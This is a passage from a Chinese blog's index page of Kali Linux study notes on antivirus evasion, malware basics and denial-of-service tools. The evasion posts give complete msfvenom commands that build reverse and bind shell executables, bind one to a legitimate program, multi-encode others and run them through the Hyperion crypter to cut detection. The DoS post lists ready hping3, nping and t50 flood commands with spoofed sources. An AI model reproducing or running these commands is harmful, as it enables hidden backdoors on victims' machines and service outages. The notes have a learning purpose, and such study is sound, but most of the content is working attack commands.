<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;5&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/5/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/" itemprop="url">Kali Linux笔记(九十)：免杀技术--模板程序附着</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:10:01+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  123 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-msfvenom–隐藏shell"><a href="#1-msfvenom–隐藏shell" class="headerlink" title="1. msfvenom–隐藏shell"></a>1. msfvenom–隐藏shell</h4><ul>
<li>▲ 附着在正常的程序模板上</li>
<li>msfvenom参数<ul>
<li>-x（指定模板）</li>
</ul>
</li>
<li>生成隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_plink_a.exe</code></strong></li>
</ul>
</li>
<li>编码隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; msfvenom_plink_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=913dDsqoWqfgmCFaxKULa3Rs26q5N6faEj-afSVWXxmPFEyWfi0FyK0A_thO4SqsOfvw87Ge1Hny12CKH58veLiiG6xtX0el8dfZAsbAjsjpkjqvWWXxKG2Wz_sb64nD_Q&file_name=/msfvenom_plink_a.PNG" alt="msfvenom_plink_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7f190bA3M9ax_a8Q1iqGnAIpJSaoB7yLOES6ROWFjeyme_9ZqSszd37r_FPxawbOPK__maiCzUOBaOmPv2WB6NsnUWrDxn8z1nMSpSNY2mSMDrD8Xx3tAlUQRVTdu3pBbQ&file_name=/msfvenom_plink_b.PNG" alt="msfvenom_plink_b.exe"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/" itemprop="url">Kali Linux笔记(八十九)：免杀技术--crypter加密</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T19:55:34+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  418 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-msfvenom–加密shell"><a href="#1-msfvenom–加密shell" class="headerlink" title="1. msfvenom–加密shell"></a>1. msfvenom–加密shell</h4><ul>
<li>msfvenom参数<ul>
<li>-p（使用的payload）</li>
<li>-a（目标机器的架构）</li>
<li>–platform（目标机器的平台）</li>
<li>-f（生成的文件file）</li>
<li>-o（输出的文件）</li>
<li>-f（原文件格式，可通过管道）</li>
<li>-e（echo加密编码）</li>
<li>-i（加密的次数，跟-e一起使用）</li>
<li>-b（特殊字符的过来）</li>
</ul>
</li>
<li>strings → 查看文件中可读字符串  md5sum → 文件的md5值</li>
<li>生成反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_crypt_a.exe</code></strong></li>
</ul>
</li>
<li>加密编码反弹shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o msfvenom_crypt_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=8f0a1L_0As6Rho8dCl4UUhyCmqiHqovU3g8Jhd-ON4QtEATGbXAQ5cKA0yi8ZA4fTsdKrGvGcnYyaI9cXNu2UMIxMvOodTNP2hKU4OV_pH8gqeQAZlVxuG6PMtyarIlC6w&file_name=/msfvenom_crypt_a.PNG" alt="msfvenom_crypt_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=6cd2aOzy5MKuuA0pY73udUOCHBetewBeXijmZea0d-Se5oacdk_3Nm6KhwZUwEK2MJ2ZRAbm0DsXRKv9-njd6hQ0kpMNksZp6FyuHffV1_ciPbTiU2EkXqNf4fO4tNaJ1A&file_name=/msfvenom_crypt_b.PNG" alt="msfvenom_crypt_b.exe"></p>
<h4 id="2-Hyperion–软件保护"><a href="#2-Hyperion–软件保护" class="headerlink" title="2. Hyperion–软件保护"></a>2. Hyperion–软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion（32bit PE程序加密器）<ul>
<li>window平台上的加密器</li>
<li>Crypter / Container（解密器+PE Loader）</li>
<li>默认路径：/usr/share/windows-binaries/</li>
<li><a href="https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip" target="_blank" rel="noopener">https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</a> </li>
<li><strong><code>🔺命令：unzip Hyperion-1.2.zip</code></strong> </li>
<li><strong><code>🔺命令：cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</code></strong> </li>
<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o msfvenom_hyperion_a.exe</code></strong> </li>
<li><strong><code>🔺命令：wine h.exe msfvenom_hyperion_a.exe msfvenom_hyperion_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell类似的免杀效果（查杀网站）</li>
<li>▲ 2020.2.13Hyperion2.2版本在Linux上的编译无法完成</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=fd7fcm5altn_ywl6IaSFu-cEmdTZxX2GyJoYoFz5nMXEYMVEAEBqXfRVglRb_D2UTQ7bVQbRYhC5-akLtiF7J5q6AghORRd75nK8SwJU3ne1DYvqY_hdr_4l1b7MGqfXdMPCQw&file_name=/msfvenom_hyperion_a.PNG" alt="msfvenom_hyperion_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=b04dEruGxgUTqqkEauX-ErRpeocbjwYTIOL7qOfv5xL8gVOYsy9n-4G1ofw_jPZqtsQFpKfNIcvJ_sHvMjjV-aCKTfRJzrc6yhboOqpA9UjNF31MNyhgpTD4yCA-JZ3xXvV-JQ&file_name=/msfvenom_hyperion_b.PNG" alt="msfvenom_hyperion_b.exe"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AB)%EF%BC%9A%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81%E9%98%B2%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E3%80%81%E5%BD%93%E5%89%8D%E7%8E%B0%E7%8A%B6/" itemprop="url">Kali Linux笔记(八十八)：恶意软件、防病毒软件、当前现状</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T16:18:23+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  590 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1. 恶意软件"></a>1. 恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装</li>
<li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2. 防病毒软件"></a>2. 防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒（OS上，查看邮件流/防火墙后，对邮件流进行查杀）</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法（病毒特征库）</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3. 免杀技术"></a>3. 免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密使得特征字符不可读，从而逃避AV检测</li>
<li>运行时分片分段的解密执行，注入进程或AV不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器crypter的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4. 当前现状"></a>4. 当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有RAT软件，避免普遍被AV所知的特征字符</li>
<li>使用独有crypter软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable是最高追求（FUD）</li>
</ul>
</li>
<li>AV厂商<ul>
<li>广泛采集样本，尽快发现新出现的恶意程序，更新病毒库</li>
<li>一般新的恶意软件安全UD窗口期是一周左右</li>
<li>与恶意软件制造者永无休止的拉锯战</li>
<li>新的启发式检测技术尚有待完善（误杀露杀）</li>
</ul>
</li>
<li>单一AV厂商的病毒库很难达到100%覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软件免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.viruscan.org/" target="_blank" rel="noopener">http://www.viruscan.org/</a> ▲ 2020.2.13此网站不可用</li>
<li>在线多引擎查杀网站与AV厂商共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check" target="_blank" rel="noopener">http://viruscheckmate.com/check</a> ▲ 2020.2.13此网站不可用</li>
</ul>
</li>
</ul>
</li>
<li>常用RAT软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
<li>▲ 下载测试几款RAT软件</li>
<li>▲ 2020.2.13已下载到灰鸽子、NanoCore</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E5%B7%A5%E5%85%B7%E5%8C%85/" itemprop="url">Kali Linux笔记(八十七)：DoS工具包</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T15:57:51+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-拒绝服务攻击工具"><a href="#1-拒绝服务攻击工具" class="headerlink" title="1. 拒绝服务攻击工具"></a>1. 拒绝服务攻击工具</h4><ul>
<li>RUDY<ul>
<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
<li>▲ 与slowhttptest的区别：每次只传输一个字节的数据</li>
<li>▲ 攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
<li>美剧”黑客军团”中曾提到此攻击手段</li>
<li><a href="http://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">http://sourceforge.net/projects/r-u-dead-yet/</a></li>
</ul>
</li>
<li>Hping3<ul>
<li>几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试</li>
<li>参数<ul>
<li>-c（建立的连接数）</li>
<li>-d（发送的数据包要有多大）</li>
<li>-S（Syn Flood攻击）</li>
<li>-w（window大小，默认为64字节）</li>
<li>-p（目标端口）</li>
<li>–rand-source（随机产生源地址）</li>
<li>-P/-U（TCP标记位PSH/URG）</li>
<li>-q（不显示攻击结果）</li>
<li>-a（伪造源地址）</li>
<li>-n（不解析域名）</li>
<li>-s（指定源端口）</li>
</ul>
</li>
<li>Syn Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood</code></strong> –rand-source 1.1.1.1</li>
<li><strong><code>🔺命令：hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
</ul>
</li>
<li>TCP Flood攻击     <ul>
<li><strong><code>🔺命令：hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></strong></li>
</ul>
</li>
<li>ICMP Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2</code></strong></li>
</ul>
</li>
<li>UDP Flood攻击<ul>
<li><strong><code>🔺命令：hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2</code></strong></li>
</ul>
</li>
<li>LAND攻击<ul>
<li>特殊种类的SYN FLood攻击</li>
<li>源地址、目的地址都是受害者，受害者于自己完成三次握手</li>
<li><strong><code>🔺命令：hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>nping<ul>
<li>TCP全链接DoS攻击<ul>
<li><strong><code>🔺命令：nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></strong></li>
</ul>
</li>
<li>查公网IP<ul>
<li><strong><code>🔺命令：nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Siege<ul>
<li>http/https压力测试工具，模拟多个用户并发访问请求</li>
<li><strong><code>🔺命令：siege -g http://1.1.1.1/a.php / 1.1.1.1</code></strong> </li>
<li><strong><code>🔺命令：siege -i -c 1000</code></strong></li>
<li><strong><code>🔺命令：siege -i -c 1000 http://1.1.1.1/a.php -A siegehttp</code></strong></li>
<li>同时攻击多个url，使用-f调用字典文件<ul>
<li>/etc/siege/urls.txt </li>
</ul>
</li>
</ul>
</li>
<li>T50网络压力测试<ul>
<li>▲ t50 -h（t50命令详细）</li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80</code></strong> </li>
<li><strong><code>🔺命令：t50 1.1.1.1 --flood --turbo -S TCP UDP OSPF EIGRP --dport 22</code></strong></li>
</ul>
</li>
<li>Nmap<ul>
<li><strong><code>🔺命令：grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2</code></strong></li>
<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/script.db</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-匿名者拒绝服务工具包"><a href="#2-匿名者拒绝服务工具包" class="headerlink" title="2. 匿名者拒绝服务工具包"></a>2. 匿名者拒绝服务工具包</h4><ul>
<li>匿名者发布的DoS工具<ul>
<li>LOIC</li>
<li>HOIC</li>
<li>DDoSer</li>
</ul>
</li>
<li>招募志愿者发放以上工具</li>
<li>以上DoS工具不隐藏真实IP地址</li>
<li>▲ 选取消耗系统资源更大的页面</li>
</ul>
<h4 id="3-其他拒绝服务工具"><a href="#3-其他拒绝服务工具" class="headerlink" title="3. 其他拒绝服务工具"></a>3. 其他拒绝服务工具</h4><ul>
<li>XOIC<ul>
<li>攻击任意IP地址的指定端口</li>
<li><strong><code>🔺命令：git clone git://git.code.sf.net/p/xoic/code xoic-code</code></strong> </li>
<li><a href="https://xoicdoser.wordpress.com/" target="_blank" rel="noopener">https://xoicdoser.wordpress.com/</a></li>
<li>三种模式：test、normal、DoS Attack</li>
<li>支持协议：TCP/HTTP/UDP/ICMP</li>
<li>▲ 数据包难以找到/软件包带有恶意软件</li>
</ul>
</li>
<li>HULK–Http Unbearable Load King<ul>
<li>Python脚本</li>
<li>随机产生大量唯一的地址请求，避免缓存命中（▲ 对企业有nginx等反向代理软件）</li>
<li>耗尽WEB服务器资源池</li>
<li><a href="https://packetstormsecurity.com/files/download/112856/hulk.zip" target="_blank" rel="noopener">https://packetstormsecurity.com/files/download/112856/hulk.zip</a></li>
</ul>
</li>
<li>DDoSIM<ul>
<li>7层拒绝服务工具（模拟多个僵尸机）</li>
<li>随机IP地址</li>
<li>基于TCP连接的攻击</li>
<li>应用层DDoS攻击</li>
<li>正常的HTTP请求、非正常的HTTP请求式DDoS</li>
<li>SMTP DDoS</li>
<li>随机端口的TCP连接洪水</li>
<li>▲ 数据包难以找到/软件包带有恶意软件</li>
<li>▲ 2020.2.13 找到此工具后无法编译</li>
</ul>
</li>
